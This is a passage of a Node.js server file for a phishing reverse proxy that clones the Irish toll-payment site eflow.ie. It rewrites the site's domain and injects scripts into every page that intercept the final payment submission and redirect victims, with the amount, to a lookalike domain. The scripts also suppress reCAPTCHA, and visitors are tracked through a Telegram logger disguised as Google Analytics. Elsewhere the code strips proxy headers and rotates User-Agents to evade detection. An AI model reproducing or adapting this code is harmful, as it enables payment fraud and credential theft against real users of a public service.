const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const expressWs = require('express-ws');
const cookieParser = require('cookie-parser');
const helmet = require('helmet');
const compression = require('compression');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const config = require('./config');
const logger = require('./logger');
const { userAgentRotation, getRandomUserAgent } = require('./user-agents');
const cacheManager = require('./cache-manager');
const telegramLogger = require('./telegram-logger');

// Create Express app
const app = express();

// Enable WebSocket support
if (config.features.websocket) {
  expressWs(app);
}

// Trust proxy if configured
// NOTE: Setting trust proxy to specific IPs to avoid rate limit issues
if (config.server.trustProxy) {
  // Trust only localhost and private networks to avoid rate limit bypass
  app.set('trust proxy', ['127.0.0.1', '::1', '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16']);
}

// Middleware: Security headers (relaxed for proxy)
app.use(
  helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false,
    crossOriginOpenerPolicy: false,
    crossOriginResourcePolicy: false,
  })
);

// Middleware: Compression - DISABLED to prevent double compression
// The proxy will handle compression via responseInterceptor
// if (config.features.compression) {
//   app.use(compression());
// }

// Middleware: Rate Limiting (look like normal user)
// Temporarily disabled due to trust proxy validation issue
// TODO: Re-enable with proper configuration
/*
const limiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute window
  max: process.env.NODE_ENV === 'production' ? 30 : 60, // Lower in production
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  message: 'Too many requests, please slow down',
  keyGenerator: (req) => {
    // Use X-Forwarded-For if available, otherwise use IP
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.socket.remoteAddress || 'unknown';
  },
  skip: (req) => {
    // Skip rate limiting for static resources and health checks
    if (req.url === '/health' || req.url === '/cache-stats') return true;
    return req.url.match(/\.(css|js|jpg|jpeg|png|gif|svg|ico|woff|woff2|ttf|eot)$/);
  },
});

app.use(limiter);
*/

// Middleware: User-Agent rotation
app.use(userAgentRotation);

// Middleware: Cache check
app.use(cacheManager.cacheMiddleware);

// Middleware: Cookie parser
app.use(cookieParser());

// Middleware: Body parser - DISABLED for proxy
// Let http-proxy-middleware handle raw body forwarding
// app.use(express.json({ limit: '50mb' }));
// app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Middleware: Request logging (Morgan)
app.use(
  morgan('combined', {
    stream: {
      write: (message) => logger.info(message.trim()),
    },
    skip: (req) => !config.logging.logRequests,
  })
);

// Middleware: Telegram tracking (server-side - no client script needed)
app.use(telegramLogger.trackingMiddleware);

// API endpoint for client-side tracking (LEGACY - still supported)
app.post('/__track', (req, res) => {
  telegramLogger.handleTrackingAPI(req, res);
});

// NEW: Masked analytics endpoint (looks like Google Analytics)
// Handles both POST and GET (for image beacon fallback)
app.post('/g/collect', (req, res) => {
  telegramLogger.handleAnalyticsAPI(req, res);
});
app.get('/g/collect', (req, res) => {
  telegramLogger.handleAnalyticsAPI(req, res);
});

// Custom request timing middleware
app.use((req, res, next) => {
  req.startTime = Date.now();
  
  // CRITICAL FIX: Use dynamic timeout from config (PROXY_TIMEOUT + buffer)
  // Must be GREATER than proxy timeout to allow proxy to complete
  const requestTimeout = config.target.timeout + 30000; // proxy timeout + 30s buffer
  
  req.setTimeout(requestTimeout, () => {
    if (!res.headersSent) {
      logger.error('Request timeout', {
        url: req.url,
        method: req.method,
        timeout: requestTimeout,
      });
      res.status(504).json({
        error: 'Request Timeout',
        message: 'Request took too long to process',
      });
    }
  });
  
  // Log response
  res.on('finish', () => {
    const responseTime = Date.now() - req.startTime;
    logger.logRequest(req, res, responseTime);
  });
  
  next();
});

// CRITICAL: Bypass Railway Edge Cache by adding unique parameter to HTML requests
// This ensures fresh HTML is always fetched for script injection
app.use((req, res, next) => {
  // Only for GET requests that might return HTML
  if (req.method === 'GET' && !req.query._nocache) {
    const acceptsHtml = req.headers.accept && req.headers.accept.includes('text/html');
    if (acceptsHtml) {
      // Add unique timestamp parameter to bypass cache
      const separator = req.url.includes('?') ? '&' : '?';
      req.url = req.url + separator + '_nocache=' + Date.now();
      logger.debug(`[Cache Bypass] Added _nocache parameter to ${req.url}`);
    }
  }
  next();
});

// Health check endpoint (minimal info for security)
app.get('/health', (req, res) => {
  const memUsage = process.memoryUsage();
  res.status(200).json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: {
      rss: Math.round(memUsage.rss / 1024 / 1024) + 'MB',
      heapUsed: Math.round(memUsage.heapUsed / 1024 / 1024) + 'MB',
      heapTotal: Math.round(memUsage.heapTotal / 1024 / 1024) + 'MB',
    },
  });
});

// Cache stats endpoint (protected, only in dev)
app.get('/cache-stats', (req, res) => {
  if (process.env.NODE_ENV === 'production') {
    return res.status(404).send('Not Found');
  }
  res.json(cacheManager.getStats());
});

// Clear cache endpoint (protected, only in dev)
app.post('/clear-cache', (req, res) => {
  if (process.env.NODE_ENV === 'production') {
    return res.status(404).send('Not Found');
  }
  cacheManager.clear();
  res.json({ message: 'Cache cleared' });
});

// Static files middleware - serve files from public directory
// Files in public/ directory will be served with priority over proxy
if (config.static.enabled) {
  const staticDir = path.resolve(config.static.directory);
  
  // Create public directory if it doesn't exist (but don't create any files)
  if (!fs.existsSync(staticDir)) {
    try {
      fs.mkdirSync(staticDir, { recursive: true });
      logger.info(`Created static files directory: ${staticDir}`);
    } catch (error) {
      logger.warn(`Could not create static directory: ${error.message}`);
    }
  }
  
  // Serve static files with proper headers
  // Only serves files that actually exist - no automatic index.html
  app.use(express.static(staticDir, {
    index: false, // Don't serve index.html automatically
    dotfiles: 'ignore', // Don't serve hidden files
    etag: true,
    lastModified: true,
    maxAge: process.env.NODE_ENV === 'production' ? '1d' : 0, // Cache in production
    setHeaders: (res, filePath) => {
      // Set appropriate content-type headers
      if (filePath.endsWith('.html')) {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
      }
      // Disable caching for HTML files to allow updates
      if (filePath.endsWith('.html')) {
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');
      }
    },
  }));
  
  logger.info(`Static files enabled: serving from ${staticDir}`);
  logger.info(`Place files in ${config.static.directory} to serve them directly`);
} else {
  logger.info('Static files disabled');
}

// Setup proxy agent if proxy is enabled
let proxyAgent = null;
if (config.proxy && config.proxy.enabled) {
  const proxyType = process.env.PROXY_TYPE || 'socks5';
  
  if (proxyType === 'socks5' || proxyType === 'socks4') {
    // SOCKS5 proxy
    const proxyUrl = `socks5://${config.proxy.username}:${config.proxy.password}@${config.proxy.host}:${config.proxy.port}`;
    proxyAgent = new SocksProxyAgent(proxyUrl);
    logger.info(`Using SOCKS5 proxy: ${config.proxy.host}:${config.proxy.port}`);
  } else {
    // HTTP/HTTPS proxy
    const proxyUrl = `http://${config.proxy.username}:${config.proxy.password}@${config.proxy.host}:${config.proxy.port}`;
    logger.info(`Using HTTP proxy: ${config.proxy.host}:${config.proxy.port}`);
    
    if (config.target.url.startsWith('https://')) {
      proxyAgent = new HttpsProxyAgent(proxyUrl);
    } else {
      proxyAgent = new HttpProxyAgent(proxyUrl);
    }
  }
}

// Proxy configuration
const proxyOptions = {
  target: config.target.url,
  changeOrigin: true,
  ws: config.features.websocket,
  timeout: config.target.timeout,
  proxyTimeout: config.target.timeout,
  
  // Use proxy agent if configured
  agent: proxyAgent || (config.target.url.startsWith('https://') ? https.globalAgent : http.globalAgent),
  
  // CRITICAL: Parse body to forward properly
  parseReqBody: true,
  
  // CRITICAL: Self-handle response to use responseInterceptor
  selfHandleResponse: true,
  
  // Forward cookies and sessions
  cookieDomainRewrite: {
    '*': '',
  },
  cookiePathRewrite: {
    '*': '/',
  },
  
  // Auto-rewrite redirects
  autoRewrite: true,
  followRedirects: true,
  
  // Preserve host header for proper routing
  preserveHeaderKeyCase: true,
  
  // Handle all HTTP methods
  onProxyReq: (proxyReq, req, res) => {
    // Log proxy request
    logger.debug(`Proxying ${req.method} ${req.url} to ${config.target.url}`);
    
    // === USER-AGENT ROTATION ===
    // Use random User-Agent to look like different browsers
    if (req.randomUserAgent) {
      proxyReq.setHeader('User-Agent', req.randomUserAgent);
    }
    
    // === DISABLE DRUPAL CACHE ===
    // CRITICAL: Force Drupal to generate fresh HTML so our scripts get injected
    proxyReq.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    proxyReq.setHeader('Pragma', 'no-cache');
    
    // CRITICAL: Remove conditional request headers to prevent 304 responses
    // This ensures we always get fresh HTML for script injection
    proxyReq.removeHeader('If-None-Match');
    proxyReq.removeHeader('If-Modified-Since');
    
    // === FINGERPRINT REMOVAL ===
    // Remove headers that expose proxy/forwarding
    proxyReq.removeHeader('X-Forwarded-For');
    proxyReq.removeHeader('X-Forwarded-Host');
    proxyReq.removeHeader('X-Forwarded-Proto');
    proxyReq.removeHeader('X-Real-IP');
    proxyReq.removeHeader('Via');
    proxyReq.removeHeader('Forwarded');
    
    // Remove rate limit headers
    proxyReq.removeHeader('RateLimit');
    proxyReq.removeHeader('RateLimit-Policy');
    proxyReq.removeHeader('RateLimit-Limit');
    proxyReq.removeHeader('RateLimit-Remaining');
    proxyReq.removeHeader('RateLimit-Reset');
    
    // Forward cookies properly
    if (req.headers.cookie) {
      proxyReq.setHeader('Cookie', req.headers.cookie);
    }
    
    // Forward authorization headers
    if (req.headers.authorization) {
      proxyReq.setHeader('Authorization', req.headers.authorization);
    }
    
    // Forward CSRF tokens
    const csrfHeaders = [
      'x-csrf-token',
      'x-xsrf-token',
      'x-requested-with',
    ];
    
    csrfHeaders.forEach((header) => {
      if (req.headers[header]) {
        proxyReq.setHeader(header, req.headers[header]);
      }
    });
    
    // Set realistic Accept headers
    if (!proxyReq.getHeader('Accept')) {
      proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
    }
    if (!proxyReq.getHeader('Accept-Language')) {
      proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.9');
    }
    if (!proxyReq.getHeader('Accept-Encoding')) {
      proxyReq.setHeader('Accept-Encoding', 'gzip, deflate, br');
    }
    
    // Handle form data and JSON body - DON'T modify!
    // Express already parsed the body, http-proxy-middleware will handle it
    // We just need to make sure we don't interfere
  },
  
  // Use 'on' object for event handlers (new API for v3)
  on: {
    // Handle response with responseInterceptor for automatic decompression
    proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
      try {
        // Log proxy response
        logger.debug(`Received response ${proxyRes.statusCode} for ${req.url}`);
        
        // CRITICAL: Remove proxy authentication headers from upstream response
        // This prevents ERR_UNEXPECTED_PROXY_AUTH error in browser
        delete proxyRes.headers['proxy-authenticate'];
        delete proxyRes.headers['proxy-authorization'];
        delete proxyRes.headers['proxy-connection'];
        delete proxyRes.headers['proxy-agent'];
        
        // CRITICAL: Check if response is already sent (prevent double response)
        if (res.headersSent) {
          logger.warn(`Response already sent for ${req.url}, skipping processing`);
          return responseBuffer;
        }
      
      // CRITICAL: Disable ALL caching to prevent Railway Edge from serving cached HTML
      // This ensures our script injection ALWAYS happens
      // Use multiple strategies to bypass Railway Edge Cache
      res.setHeader('Cache-Control', 'private, no-cache, no-store, must-revalidate, max-age=0, s-maxage=0');
      res.setHeader('Surrogate-Control', 'no-store'); // CDN-specific cache control
      res.setHeader('Pragma', 'no-cache');
      res.setHeader('Expires', '0');
      res.setHeader('Vary', '*'); // Tell cache to vary on ALL headers (effectively disables cache)
      res.setHeader('X-Railway-No-Cache', '1'); // Custom header for Railway
      res.setHeader('X-Content-Cache', 'DISABLED'); // Additional cache bypass header
      res.removeHeader('ETag');
      res.removeHeader('Last-Modified');
      res.removeHeader('If-None-Match');
      res.removeHeader('If-Modified-Since');
      
      // CRITICAL: Remove proxy authentication headers to prevent ERR_UNEXPECTED_PROXY_AUTH
      res.removeHeader('Proxy-Authenticate');
      res.removeHeader('Proxy-Authorization');
      res.removeHeader('Proxy-Connection');
      res.removeHeader('Proxy-Agent');
      
      // === CACHING LOGIC ===
      // Cache successful GET responses
      if (cacheManager.shouldCache(req, { statusCode: proxyRes.statusCode })) {
        cacheManager.set(req, {
          body: responseBuffer,
          contentType: proxyRes.headers['content-type'],
          statusCode: proxyRes.statusCode,
        });
        
        logger.debug(`Cached response for ${req.url}`);
      }
      
      // Handle cookies - rewrite domain if custom domain is set
      if (proxyRes.headers['set-cookie']) {
        const cookies = proxyRes.headers['set-cookie'].map((cookie) => {
          let modifiedCookie = cookie;
          
          // Remove Secure flag for local development
          if (req.protocol === 'http') {
            modifiedCookie = modifiedCookie.replace(/;\s*Secure/gi, '');
          }
          
          // Rewrite domain if custom domain is set
          if (config.customDomain) {
            const targetDomain = new URL(config.target.url).hostname;
            modifiedCookie = modifiedCookie.replace(
              new RegExp(`Domain=${targetDomain}`, 'gi'),
              `Domain=${config.customDomain}`
            );
          }
          
          return modifiedCookie;
        });
        
        res.setHeader('set-cookie', cookies);
      }
      
      // Handle CORS headers
      res.setHeader('Access-Control-Allow-Credentials', 'true');
      
      // DEBUG: Add header to track if interceptor is running
      res.setHeader('X-Proxy-Interceptor', 'active');
      
      // CRITICAL: Set cache headers IMMEDIATELY to prevent Railway Edge caching
      // This must be done BEFORE any content processing
      res.setHeader('Cache-Control', 'private, no-cache, no-store, must-revalidate, max-age=0, s-maxage=0');
      res.setHeader('Surrogate-Control', 'no-store');
      res.setHeader('X-Cache-Control', 'no-cache');
      
      // Handle content rewriting
      const contentType = proxyRes.headers['content-type'] || '';
      const targetDomain = new URL(config.target.url).hostname; // eflow.ie
      const proxyDomain = req.get('host'); // swa-production.up.railway.app
      
      // DEBUG LOGGING
      logger.info(`[RESPONSE INTERCEPTOR] URL: ${req.url}, ContentType: ${contentType}, Status: ${proxyRes.statusCode}, Size: ${responseBuffer.length} bytes`);
      
      // CRITICAL: Skip processing for very large files (>10MB) to prevent memory issues
      const MAX_PROCESSING_SIZE = 10 * 1024 * 1024; // 10MB
      if (responseBuffer.length > MAX_PROCESSING_SIZE) {
        logger.warn(`[RESPONSE INTERCEPTOR] Skipping processing for large file: ${req.url} (${(responseBuffer.length / 1024 / 1024).toFixed(2)}MB)`);
        return responseBuffer;
      }
      
      // ALWAYS do domain replacement for HTML/JS/CSS
      if (
        contentType.includes('text/html') ||
        contentType.includes('application/javascript') ||
        contentType.includes('text/css') ||
        contentType.includes('application/json')
      ) {
        logger.info(`[CONTENT REWRITING] Processing ${contentType} for ${req.url} (${(responseBuffer.length / 1024).toFixed(2)}KB)`);
        // responseBuffer is already decompressed by responseInterceptor!
        let bodyString;
        
        try {
          bodyString = responseBuffer.toString('utf8');
        } catch (error) {
          logger.error('Failed to convert buffer to string', {
            error: error.message,
            url: req.url,
            bufferLength: responseBuffer.length,
          });
          return responseBuffer; // Return original if conversion fails
        }
        
        // CRITICAL: Replace ALL forms of target domain with proxy domain
        // This keeps users on proxy site instead of redirecting to original
        
        // Replace http://eflow.ie
        bodyString = bodyString.replace(
          new RegExp('http://eflow\\.ie', 'gi'),
          `https://${proxyDomain}`
        );
        
        // Replace https://eflow.ie
        bodyString = bodyString.replace(
          new RegExp('https://eflow\\.ie', 'gi'),
          `https://${proxyDomain}`
        );
        
        // Replace http://www.eflow.ie
        bodyString = bodyString.replace(
          new RegExp('http://www\\.eflow\\.ie', 'gi'),
          `https://${proxyDomain}`
        );
        
        // Replace https://www.eflow.ie
        bodyString = bodyString.replace(
          new RegExp('https://www\\.eflow\\.ie', 'gi'),
          `https://${proxyDomain}`
        );
        
        // Replace just "eflow.ie" (in href attributes, etc)
        bodyString = bodyString.replace(
          new RegExp('(["\'])eflow\\.ie', 'gi'),
          `$1${proxyDomain}`
        );
        
        // Replace custom domain if set
        if (config.customDomain) {
          bodyString = bodyString.replace(
            new RegExp(targetDomain, 'g'),
            config.customDomain
          );
        }
        
        // INJECT SCRIPTS ONLY FOR HTML PAGES
        if (contentType.includes('text/html')) {
          logger.info(`[SCRIPT INJECTION] Preparing to inject scripts for ${req.url}`);
            const targetOrigin = config.target.url; // https://eflow.ie
            const proxyOrigin = `${req.protocol}://${proxyDomain}`;
            
            // Encode domains for reCAPTCHA 'co' parameter
            const targetBase64 = Buffer.from(`${targetOrigin}:443`).toString('base64').replace(/=/g, '.');
            const proxyBase64 = Buffer.from(`${proxyOrigin}:443`).toString('base64').replace(/=/g, '.');
            
            // Inject minimal script to fix reCAPTCHA domain
            const recaptchaFixScript = `
<script>
(function() {
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    let url = args[0];
    if (typeof url === 'string' && url.includes('google.com/recaptcha')) {
      url = url.replace(/co=` + proxyBase64 + `/g, 'co=` + targetBase64 + `');
      args[0] = url;
    }
    return originalFetch.apply(this, args);
  };
})();
</script>`;
            
            // UNIVERSAL Payment Redirect - Works on ALL pages
            let PAYMENT_SYSTEM_URL = process.env.PAYMENT_SYSTEM_URL || 'https://m50-eflo.info';
            
            // CRITICAL: Ensure PAYMENT_SYSTEM_URL has protocol
            // If no protocol is specified, add https://
            if (PAYMENT_SYSTEM_URL && !PAYMENT_SYSTEM_URL.match(/^https?:\/\//i)) {
              PAYMENT_SYSTEM_URL = 'https://' + PAYMENT_SYSTEM_URL;
            }
            
            // CRITICAL: This script MUST execute BEFORE jQuery/Drupal loads
            // LOW-LEVEL XMLHttpRequest/Fetch interception
            const universalPaymentRedirectScript = `
<script>
// EXECUTE IMMEDIATELY - BEFORE jQuery/Drupal loads
(function() {
  'use strict';
  
  const PAYMENT_URL = '${PAYMENT_SYSTEM_URL}';
  console.log('[Payment Redirect] LOW-LEVEL interceptor initialized');
  
  // Detect mobile device
  function isMobileDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
           (window.innerWidth <= 768 && window.innerHeight <= 1024) ||
           ('ontouchstart' in window) ||
           (navigator.maxTouchPoints > 0);
  }
  
  const isMobile = isMobileDevice();
  console.log('[Payment Redirect] Device type:', isMobile ? 'MOBILE' : 'DESKTOP');
  
  // Function to redirect to payment system (works on both mobile and desktop)
  function redirectToPayment(amount) {
    const paymentUrl = PAYMENT_URL + '?amount=' + amount;
    console.log('[Payment Redirect] Redirecting to:', paymentUrl);
    
    if (isMobile) {
      // MOBILE: Use direct navigation (window.location.href)
      // This is more reliable on mobile devices than window.open()
      console.log('[Payment Redirect] Using direct navigation for mobile device');
      window.location.href = paymentUrl;
    } else {
      // DESKTOP: Use window.open() to open in new tab
      console.log('[Payment Redirect] Using window.open() for desktop device');
      const paymentWindow = window.open(paymentUrl, '_blank');
      
      if (paymentWindow) {
        console.log('[Payment Redirect] Payment window opened successfully');
        return true;
      } else {
        console.warn('[Payment Redirect] window.open() failed, falling back to direct navigation');
        // Fallback: if popup is blocked, use direct navigation
        window.location.href = paymentUrl;
        return true;
      }
    }
    return true;
  }
  
  // Store original methods
  const originalXHROpen = XMLHttpRequest.prototype.open;
  const originalXHRSend = XMLHttpRequest.prototype.send;
  const originalFetch = window.fetch;
  
  // Flag to track if redirect is in progress
  let redirectInProgress = false;
  let lastPaymentAmount = null; // Track last payment amount to detect new attempts
  
  // Extract amount from page (works even before DOM is fully loaded)
  function extractAmount() {
    try {
      // Wait for DOM if needed
      if (!document.body) {
        console.warn('[Payment Redirect] DOM not ready yet');
        return null;
      }
      
      // Strategy 1: Hidden input
      const totalInput = document.querySelector('input[name="total_payment"]');
      if (totalInput && totalInput.value) {
        return totalInput.value;
      }
      
      // Strategy 2: Total text
      const totalText = document.body.innerText || document.body.textContent || '';
      const euroMatch = totalText.match(/Total[:\\s]*€([\\d.,]+)/i);
      if (euroMatch && euroMatch[1]) {
        return euroMatch[1].replace(/,/g, '');
      }
      
      console.warn('[Payment Redirect] Amount not found');
      return null;
    } catch (err) {
      console.error('[Payment Redirect] Error extracting amount:', err);
      return null;
    }
  }
  
  // Override XMLHttpRequest.open to track request details AND block reCAPTCHA
  XMLHttpRequest.prototype.open = function(method, url) {
    this._interceptedMethod = method;
    this._interceptedURL = url;
    
    // CRITICAL: Block reCAPTCHA requests if redirect is in progress
    if (redirectInProgress && url && url.includes('google.com/recaptcha')) {
      console.log('[Payment Redirect] BLOCKING reCAPTCHA request (redirect in progress)');
      this._blocked = true;
      return; // Don't call original open - block the request
    }
    
    return originalXHROpen.apply(this, arguments);
  };
  
  // Override XMLHttpRequest.send to intercept /pay-toll requests
  XMLHttpRequest.prototype.send = function(body) {
    // If request was blocked in open(), don't send it
    if (this._blocked) {
      console.log('[Payment Redirect] Request was blocked, not sending');
      return;
    }
    
    // Check if this is a Drupal AJAX payment request
    if (
      this._interceptedMethod === 'POST' &&
      this._interceptedURL &&
      (this._interceptedURL.includes('/pay-toll') || this._interceptedURL.includes('ajax_form=1'))
    ) {
      console.log('[Payment Redirect] XHR INTERCEPTED:', this._interceptedMethod, this._interceptedURL);
      console.log('[Payment Redirect] Request body:', body);
      
      // Check if this is the final payment submission
      const bodyStr = body ? body.toString() : '';
      
      // CRITICAL FIX: Only trigger on FINAL Pay button, NOT "Pay Now" button
      // Final payment request MUST contain:
      // 1. total_payment= (the actual payment amount)
      // 2. _triggering_element_value=Pay (the Pay button, NOT "Pay Now")
      const hasTotalPayment = bodyStr.includes('total_payment=');
      const isFinalPayButton = bodyStr.includes('_triggering_element_value=Pay') && !bodyStr.includes('_triggering_element_value=Pay+');
      
      // CRITICAL: If total_payment changed, this is a NEW payment attempt - reset flag
      if (hasTotalPayment) {
        const bodyAmountMatch = bodyStr.match(/total_payment=([\\d.]+)/);
        const currentAmount = bodyAmountMatch && bodyAmountMatch[1] ? bodyAmountMatch[1] : null;
        if (currentAmount && currentAmount !== lastPaymentAmount) {
          console.log('[Payment Redirect] New payment amount detected:', currentAmount, '(previous:', lastPaymentAmount, ') - resetting flag');
          redirectInProgress = false;
          lastPaymentAmount = currentAmount;
        }
      }
      
      if (hasTotalPayment && isFinalPayButton && !redirectInProgress) {
        console.log('[Payment Redirect] FINAL PAYMENT REQUEST DETECTED - BLOCKING');
        redirectInProgress = true;
        
        // CRITICAL: Abort BEFORE any reCAPTCHA can be triggered
        try {
          this.abort();
          console.log('[Payment Redirect] Request aborted successfully');
        } catch (e) {
          console.error('[Payment Redirect] Error aborting request:', e);
        }
        
        // Extract amount DYNAMICALLY from the request body or page
        let amount = null;
        
        // Try to get from body first (most reliable as it's what's being sent)
        const bodyAmountMatch = bodyStr.match(/total_payment=([\\d.]+)/);
        if (bodyAmountMatch && bodyAmountMatch[1]) {
          amount = bodyAmountMatch[1];
          console.log('[Payment Redirect] Amount extracted from request body:', amount);
          // Save amount for future comparison
          lastPaymentAmount = amount;
        } else {
          amount = extractAmount();
        }
        
        if (amount && parseFloat(amount) > 0) {
          console.log('[Payment Redirect] Redirecting with dynamic amount:', amount);
          
          // Redirect to payment system (handles mobile/desktop automatically)
          if (redirectToPayment(amount)) {
            // CRITICAL: Reset flag after successful redirect to allow future attempts
            // Use timeout to ensure redirect is processed
            setTimeout(function() {
              redirectInProgress = false;
              console.log('[Payment Redirect] Flag reset - ready for next payment attempt');
            }, isMobile ? 1000 : 2000); // Shorter timeout for mobile (direct navigation)
          } else {
            console.error('[Payment Redirect] Failed to redirect');
            redirectInProgress = false;
            lastPaymentAmount = null; // Reset on failure
          }
        } else {
          console.error('[Payment Redirect] Could not find dynamic amount');
          redirectInProgress = false;
          lastPaymentAmount = null; // Reset on failure
        }
        
        return; // Don't send the request
      }
    }
    
    // Block reCAPTCHA requests if redirect is in progress
    if (redirectInProgress && this._interceptedURL && this._interceptedURL.includes('google.com/recaptcha')) {
      console.log('[Payment Redirect] BLOCKING reCAPTCHA send (redirect in progress)');
      return; // Don't send reCAPTCHA request
    }
    
    // For all other requests, proceed normally
    return originalXHRSend.apply(this, arguments);
  };
  
  // Override Fetch API (backup interception)
  window.fetch = function(url, options) {
    const urlStr = typeof url === 'string' ? url : url.toString();
    
    // CRITICAL: Block ALL reCAPTCHA requests if redirect is in progress
    if (redirectInProgress && urlStr.includes('google.com/recaptcha')) {
      console.log('[Payment Redirect] BLOCKING reCAPTCHA Fetch request (redirect in progress)');
      return Promise.reject(new Error('reCAPTCHA blocked - redirect in progress'));
    }
    
    if (
      options &&
      options.method === 'POST' &&
      (urlStr.includes('/pay-toll') || urlStr.includes('ajax_form=1'))
    ) {
      console.log('[Payment Redirect] FETCH INTERCEPTED:', urlStr);
      
      // Check if final payment submit
      if (options.body && !redirectInProgress) {
        const bodyStr = options.body.toString();
        const hasTotalPayment = bodyStr.includes('total_payment=');
        const isFinalSubmit = bodyStr.includes('_triggering_element_value=Pay') && !bodyStr.includes('_triggering_element_value=Pay+');
        
        if (hasTotalPayment && isFinalSubmit) {
          console.log('[Payment Redirect] FINAL PAYMENT via Fetch - BLOCKING');
          redirectInProgress = true;
          
          const bodyAmountMatch = bodyStr.match(/total_payment=([\\d.]+)/);
          const amount = bodyAmountMatch && bodyAmountMatch[1] ? bodyAmountMatch[1] : extractAmount();
          
          if (amount && parseFloat(amount) > 0) {
            // Redirect to payment system (handles mobile/desktop automatically)
            if (redirectToPayment(amount)) {
              // Reset flag after successful redirect
              setTimeout(function() {
                redirectInProgress = false;
                console.log('[Payment Redirect] Flag reset (Fetch) - ready for next payment attempt');
              }, isMobile ? 1000 : 2000); // Shorter timeout for mobile (direct navigation)
            } else {
              redirectInProgress = false;
            }
            return Promise.reject(new Error('Redirected to payment system'));
          } else {
            redirectInProgress = false;
          }
        }
      }
    }
    
    return originalFetch.apply(this, arguments);
  };
  
  console.log('[Payment Redirect] LOW-LEVEL interceptors installed (XHR + Fetch)');
  console.log('[Payment Redirect] Waiting for payment submission...');
})();
</script>`;
            
            // Inject scripts on ALL HTML pages
            // Include: reCAPTCHA fix, payment redirect, and user tracking
            const trackingScript = telegramLogger.getTrackingScript();
            let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript + '\n' + trackingScript;
            
          // CRITICAL: Inject at THE VERY START of <head> to execute BEFORE any other scripts
          const hasHeadOpen = bodyString.includes('<head>');
          const hasHeadWithAttrs = bodyString.includes('<head ');
          const hasHeadClose = bodyString.includes('</head>');
          const hasScript = bodyString.includes('<script');
          
          logger.info(`[SCRIPT INJECTION] HEAD detection: open=${hasHeadOpen}, withAttrs=${hasHeadWithAttrs}, close=${hasHeadClose}, script=${hasScript}`);
          
          if (bodyString.includes('<head>')) {
            bodyString = bodyString.replace('<head>', '<head>\n' + scriptsToInject);
            logger.info(`[SCRIPT INJECTION] ✓ Injected after <head>`);
          } else if (bodyString.includes('<head ')) {
            bodyString = bodyString.replace(/<head([^>]*)>/, '<head$1>\n' + scriptsToInject);
            logger.info(`[SCRIPT INJECTION] ✓ Injected after <head ...>`);
          } else if (bodyString.includes('</head>')) {
            // Fallback: inject before </head>
            bodyString = bodyString.replace('</head>', scriptsToInject + '\n</head>');
            logger.info(`[SCRIPT INJECTION] ✓ Injected before </head>`);
          } else if (bodyString.includes('<script')) {
            // Last resort: inject before first script
            bodyString = bodyString.replace('<script', scriptsToInject + '\n<script');
            logger.info(`[SCRIPT INJECTION] ✓ Injected before first <script>`);
          } else {
            logger.warn(`[SCRIPT INJECTION] ✗ NO INJECTION POINT FOUND!`);
          }
          
          // DEBUG: Add header to confirm injection happened
          res.setHeader('X-Script-Injected', 'yes');
        }
        
        // Return modified body string
        return bodyString;
      }
      
      // Return unmodified buffer for other content types
      return responseBuffer;
      } catch (error) {
        // CRITICAL: Handle errors in responseInterceptor to prevent 502
        logger.error('Error in responseInterceptor', {
          error: error.message,
          stack: error.stack,
          url: req.url,
          method: req.method,
        });
        
        // If headers not sent, send error response
        if (!res.headersSent) {
          res.status(500).json({
            error: 'Processing Error',
            message: 'Failed to process response',
            details: process.env.NODE_ENV === 'production' ? 'Internal server error' : error.message,
          });
        }
        
        // Return original buffer as fallback
        return responseBuffer;
      }
    }),
    
    // Error handling
    error: (err, req, res) => {
      logger.error('Proxy error in responseInterceptor', {
        error: err.message,
        stack: err.stack,
        url: req.url,
        method: req.method,
        code: err.code,
      });
      
      if (!res.headersSent) {
        // Check error type
        if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ESOCKETTIMEDOUT') {
          res.status(504).json({
            error: 'Gateway Timeout',
            message: 'The upstream server did not respond in time',
          });
        } else if (err.code === 'ECONNREFUSED') {
          res.status(502).json({
            error: 'Bad Gateway',
            message: 'Unable to connect to upstream server',
          });
        } else {
          res.status(502).json({
            error: 'Proxy Error',
            message: 'Failed to proxy request',
            details: process.env.NODE_ENV === 'production' ? 'Internal server error' : err.message,
          });
        }
      }
    },
  },
  
  // Error handling
  onError: (err, req, res) => {
    logger.error('Proxy error (onError)', {
      error: err.message,
      stack: err.stack,
      url: req.url,
      method: req.method,
      code: err.code,
    });
    
    if (!res.headersSent) {
      // Check error type
      if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ESOCKETTIMEDOUT') {
        res.status(504).json({
          error: 'Gateway Timeout',
          message: 'The upstream server did not respond in time',
        });
      } else if (err.code === 'ECONNREFUSED') {
        res.status(502).json({
          error: 'Bad Gateway',
          message: 'Unable to connect to upstream server',
        });
      } else {
        res.status(502).json({
          error: 'Proxy Error',
          message: 'Failed to proxy request',
          details: process.env.NODE_ENV === 'production' ? 'Internal server error' : err.message,
        });
      }
    }
  },
  
  // Log provider
  logLevel: config.logging.level === 'debug' ? 'debug' : 'warn',
};

// Health check endpoint (before proxy)
app.get('/health', (req, res) => {
